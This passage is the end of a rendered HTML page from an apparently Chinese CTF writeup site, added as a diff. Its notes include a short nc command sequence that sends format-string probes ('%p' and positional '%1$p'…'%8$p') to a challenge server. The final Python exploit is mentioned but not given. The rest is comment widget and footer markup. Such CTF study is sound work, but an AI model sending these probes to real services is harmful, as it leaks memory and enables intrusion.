+<h2 id="_10">脚本归档<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Python：待补</li>
+<li>说明：本题最终利用是一个很短的 Python socket + <code>struct.pack</code> 脚本，核心逻辑已在正文中给出</li>
+</ul>
+<h2 id="gui">命令行提取关键数据（无 GUI）<a class="headerlink" href="#gui" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="c1"># 1. 普通回显验证</span>
+<span class="nb">echo</span><span class="w"> </span>hello<span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>nc.umbccd.net<span class="w"> </span><span class="m">8925</span>
+
+<span class="c1"># 2. 格式化字符串探针</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;%p %p %p %p %p %p %p %p&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>nc.umbccd.net<span class="w"> </span><span class="m">8925</span>
+
+<span class="c1"># 3. 枚举位置参数</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;%1\$p|%2\$p|%3\$p|%4\$p|%5\$p|%6\$p|%7\$p|%8\$p&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nc<span class="w"> </span>nc.umbccd.net<span class="w"> </span><span class="m">8925</span>
+
+<span class="c1"># 4. 发送最终 payload（建议用 Python 生成）</span>
+python<span class="w"> </span>exploit.py
+</code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="__comments">评论</h2>
+
+<script
+  src="https://giscus.app/client.js"
+  data-repo="your-username/your-repo"
+  data-repo-id=""
+  data-category="Writeup Comments"
+  data-category-id=""
+  data-mapping="pathname"
+  data-strict="1"
+  data-reactions-enabled="1"
+  data-emit-metadata="0"
+  data-input-position="top"
+  data-theme="preferred_color_scheme"
+  data-lang="zh-CN"
+  data-loading="lazy"
+  crossorigin="anonymous"
+  async>
+</script>
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+    <a href="https://github.com/starnotes-xj/BIGC_CTF_Writeups" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.tracking", "navigation.path", "navigation.tabs", "navigation.tabs.sticky", "navigation.indexes", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/mathjax.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../javascripts/drawer-backdrop.js"></script>
+      
+    
+  </body>
+</html>
